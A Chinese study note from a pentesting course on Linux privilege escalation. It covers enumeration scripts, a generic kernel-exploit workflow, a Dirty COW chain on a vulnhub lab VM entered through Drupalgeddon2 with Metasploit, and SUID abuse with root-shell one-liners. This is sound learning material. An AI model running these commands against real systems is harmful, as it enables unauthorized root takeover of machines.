# 2026-08-28(续3) Linux 提权②：自动化脚本（信息收集+漏洞探针）+ 内核漏洞（脏牛）+ SUID

> 状态：🧪 理论（课程案例 1/3/4 截图），待实操
> 承接上午的 Linux 提权框架（08-28(续2)）：今天把框架里的「信息收集」「内核漏洞」两个分支落地，加 SUID。课程案例：**案例1** 四个自动化脚本（LinEnum / linuxprivchecker / linux-exploit-suggester / linux-exploit-suggester2）；**案例3** 内核漏洞提权标准流程（Mozhe 平台）；**案例4** 脏牛（Dirty COW）完整链路（vulnhub 靶机 + Drupalgeddon2 入口）。

## 一、一句话认知

信息收集不用纯手工——**两个信息收集脚本**（LinEnum / linuxprivchecker）自动扫配置类提权点，**两个漏洞探针**（linux-exploit-suggester / 2）自动对内核版本查洞；内核漏洞提权有**固定流程**（寻可用 → 下 exp → 上 /tmp → 编译 → 执行 → id 验证）；SUID 是配置类提权的经典。**信息收集 = 摸清"有什么能用"，漏洞探针 = 判断"能打哪个洞"**。

## 二、案例1：四个自动化脚本（信息收集 vs 漏洞探针）

### 1. 两个信息收集脚本

| 脚本 | 类型 | 干什么 |
|------|------|--------|
| **LinEnum** | bash 脚本 | 一键收集系统信息：内核版本、SUID 文件、计划任务、可写目录、环境变量、敏感文件……（上午框架里 8 项清单的自动化版） |
| **linuxprivchecker** | python 脚本 | 另一个信息收集器：检查权限配置错误、SUID、可写文件等 |

- **有什么用（回答课程提问）**：信息收集解决"**有什么能用**"——把 8 项清单自动跑完，输出所有**配置类提权点**（SUID 文件、可写 cron、可写目录、明文密码等），人工对着输出选打法。没有它就得一条条命令手敲。
- 对应提权方向：**配置类**（SUID / 计划任务 / 环境变量 / 可写文件）

### 2. 两个漏洞探针脚本

| 脚本 | 干什么 |
|------|--------|
| **linux-exploit-suggester** | 读取内核版本 → 对比本地漏洞库 → 列出**可能适用的内核 EXP 列表**（含 CVE 编号、exploit-db 链接） |
| **linux-exploit-suggester2** | 升级版，检查粒度更细 |

- **有什么用**：漏洞探针解决"**能打哪个内核洞**"——不用手动翻 CVE 列表/exploit-db，脚本直接告诉你这台机器内核版本匹配哪些 EXP。
- 对应提权方向：**内核漏洞**（编译 EXP 拿 root）

### 3. 两者区别（一句话记忆）

> 信息收集看**系统配置**（找配置类后门），漏洞探针看**内核版本**（找溢出洞）。使用顺序：先信息收集 → 配置类没戏 → 漏洞探针看内核有没有洞。**类比：信息收集 = 翻家里的钥匙/暗门，漏洞探针 = 查门锁型号对应的万能钥匙**。

## 三、案例3：内核漏洞提权标准流程（Mozhe）

- **提权过程（课程原话）**：连接 → 获取可利用漏洞 → 下载或上传 EXP → 编译 EXP → 给权限执行 → **GG**
- **命令序列**：
  ```
  gcc 45010.c -o 45010     # 编译 EXP（拿到的是 C 源码，目标机要有 gcc）
  chmod +x 45010           # 给执行权限（上传/解压后默认可能没有 x 权限）
  ./45010                  # 执行 EXP
  id                       # 验证：uid=0(root) 即提权成功
  ```
- **三个关键点**：
  1. **EXP 通常是 C 源码** → 必须在目标机上编译（gcc 环境是前提，没有就得静态编译/交叉编译）
  2. **chmod +x 不能省**——文件上传后默认无执行权限，不 chmod 直接 ./ 会 Permission denied
  3. **id 是验收标准**——执行完 EXP 必须看 `uid=0` 才算成功（euid=0 也行，DC-1 里 SUID 提权也是看 euid）

## 四、案例4：脏牛（Dirty COW）内核漏洞完整链路

### 1. 脏牛是什么

- **CVE-2016-5195 Dirty COW**：Linux 内核 **copy-on-write（COW）机制缺陷**——低权限用户可以利用竞争条件**写只读文件**（如 /etc/passwd）→ 改 root 密码/注入公钥 → 提权。
- 影响版本：内核 **2.6.22 ~ 4.8.3**（2016 年修复，老靶机经典洞）
- EXP：exploit-db 的 **40837.cpp**（公开版本之一，C++ 写的，用 g++ 编译）

### 2. 完整链路（vulnhub 靶机实战，课程原话流程）

> vulnhub靶机 → 探针目标 → CMS漏洞利用 → 脚本探针提权漏洞 → 利用内核提权 → gg

```
# ① 探针目标：nmap 扫网段 + 全端口
nmap 192.168.76.0/24
nmap -p1-65535 192.168.76.141

# ② CMS 漏洞利用：Drupalgeddon2（MSF 拿 meterpreter）
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set lhost 192.168.76.141
set lport 1898
set target 0
run

# ③ 脚本探针提权漏洞：meterpreter 里跑 linux-exploit-suggester → 列出脏牛
# ④ 利用内核提权：
upload /tmp/40837.cpp /tmp/40837.cpp                # EXP 源码传到 /tmp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40837.cpp -lutil   # 编译
python -c 'import pty; pty.spawn("/bin/bash")'      # 升级交互式 shell（pty 终端）
./dcow                                              # 执行 → root
```

### 3. 内核漏洞提权过程（课程口诀）

> **寻可用 → 下 exp → 上 /tmp → 编译 exp → 执行（无权限用 chmod）**

- 为什么放 **/tmp**：tmp 目录全世界可写，不用纠结权限；而且很多系统的 /tmp 是 noexec 的话要换目录（可写+可执行）
- `python -c 'import pty; pty.spawn("/bin/bash")'`：把受限 shell 升级成**交互式终端**（拿到完整的 tty，能用 tab 补全/方向键，后续操作更顺）

## 五、SUID 提权（今天第三块）

- **原理**：SUID（Set User ID）位——设置了 SUID 的**可执行文件**，运行时以**属主身份**执行。属主是 root 的 SUID 程序 = 普通用户执行它时**以 root 身份运行** → 利用程序的功能/漏洞提权。
- **检测**（找 SUID 文件）：
  ```
  find / -perm -4000 -type f 2>/dev/null
  # 或 find / -perm -u=s -type f 2>/dev/null
  ```
- **利用**：找**属主是 root + 我们能执行 + 带可利用姿势**的程序。常见姿势：
  - `find`：`find / -exec whoami \;`（DC-1 实操过，euid=0）
  - `python`：`python -c 'import os; os.setuid(0); os.system("/bin/bash")'`
  - `vim`：`vim -c ':py import os; os.setuid(0); os.execl("/bin/sh","sh")'`（老版本）
  - `nmap`（老版本 --interactive）、`less`/`more`（! 命令）、`bash`/`sh` 本身……
- **查询工具**：**GTFOBins**（gtfobins.github.io）——查任意程序的提权姿势，SUID 场景必查 ❓
- **本质**：和 Windows 的服务权限提权同构——"**高权限入口 + 配置错误**"（Windows 是服务以 SYSTEM 跑 + 权限配置差，Linux 是程序以 root 跑 + SUID 位/可写文件）

## 六、总结：今天内容 ↔ 框架映射

| 框架分支 | 今天学的落地 |
|---------|------------|
| 信息收集（8 项清单） | **LinEnum / linuxprivchecker**（自动化） |
| 提权方法-内核漏洞 | **linux-exploit-suggester/2**（探针）+ 标准流程（寻可用-下exp-上/tmp-编译-执行）+ **脏牛案例** |
| 提权方法-SUID | find -perm -4000 检测 + GTFOBins 姿势 |

**内核漏洞提权六步口诀**：寻可用 → 下 exp → 上 /tmp → 编译 → 执行 → id 验证（GG）

## 疑问

1. ❓ LinEnum / linuxprivchecker / linux-exploit-suggester 具体怎么用？（参数？输出重点看哪些行？）
2. ❓ 脏牛 EXP 为什么选 40837.cpp？（40837/40839/40847 等多个版本差异？稳定性？）
3. ❓ `g++ ... -lutil` 的 `-lutil` 是干嘛的？（脏牛 EXP 依赖的库？）
4. ❓ SUID 提权姿势完整清单？（GTFOBins 上常用哪些？怎么按场景挑？）
5. ❓ 内核 EXP 在目标机上编译失败怎么办？（目标机没 gcc → 静态编译/交叉编译/换 EXP？）

## 关联笔记

- [2026-08-28(续2)-Linux提权-总体框架.md](./2026-08-28(续2)-Linux提权-总体框架.md) — 本篇是框架「信息收集」「内核漏洞」「SUID」分支的落地
- [2026-08-15-DC1靶机渗透实战.md](./2026-08-15-DC1靶机渗透实战.md) — SUID find 提权实操 + Drupalgeddon2 实战（案例4 的 CMS 入口和 DC-1 一模一样）
- [2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md](./2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md) — 对应关系：**WES-NG（Windows 补丁筛选）= linux-exploit-suggester（Linux 漏洞探针）**，思路完全同构

## 待实践

- 靶机跑一遍 LinEnum + linux-exploit-suggester，对照输出练习"选打法"
- 复现脏牛流程（vulnhub 有脏牛靶机；40837.cpp 编译 + pty 升级 + ./dcow）
- 整理 SUID 姿势清单（GTFOBins 常用程序）
- 把 4 个脚本收进工具库（Kali 自带部分；宿主机的放 SecurityTools）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
